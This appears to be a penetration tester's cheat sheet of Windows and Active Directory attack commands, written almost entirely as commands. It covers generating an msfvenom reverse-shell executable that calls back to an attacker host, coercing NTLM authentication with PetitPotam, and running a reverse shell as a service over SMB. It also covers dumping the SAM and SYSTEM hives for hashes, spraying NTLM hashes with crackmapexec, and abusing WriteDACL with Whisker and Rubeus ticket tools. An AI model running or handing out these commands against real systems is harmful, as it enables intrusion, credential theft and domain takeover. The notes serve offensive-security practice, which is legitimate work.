# Windows

### Binary reverse shell
```
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=<IP> LPORT=33334 > reverse.exe
```

### PetimPotam

Coerce NTLM Auth
```bash
python3 PetitPotam.py -u USER -d DOMAIN -p="PASS" localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA IP
```

### Escape SMB Pseudoshell

1. You have socks samba proxy.
2. Generate the reverse shell
3. Upload
```
proxychains smbclient.py <IP>
# Select share and writable dir
$ put reverse.txt
```
4. Run via services.py
```
proxychains services.py <TARGET> -no-pass create -name revsvc -display "revsvc" -path "C:\reverse.exe"
proxychains services.py <TARGET> -no-pass start -name revsvc
```
Or use smbexec if it works
```
 proxychains smbexec.py <TARGET> -share ADMIN$ -shell-type powershell
```

### Manual SAM dump

```
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SAM C:\Temp\SAM

# download via smbclient
secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL
```

### NTLM Hash spray

```
crackmapexec smb sambas.txt  -u wadmin -H aad3b435b51404eeaad3b435b51404ee:<HASH> | grep -a '[+]'
```



### WriteDACL
```
.\whisker.exe add /target:<TARGET>$ /domain:<> /dc:<>
# Copy rubeus command add  `/nowrap`
# Convert to kirbi file
./Rubeus.exe ptt /ticket:ticket.kirbi
./Rubeus.exe tgtdeleg /ticket:ticket.kirby <service>
ticketConverter.py ca-tgt.kirbi ca-tgt.ccache
```
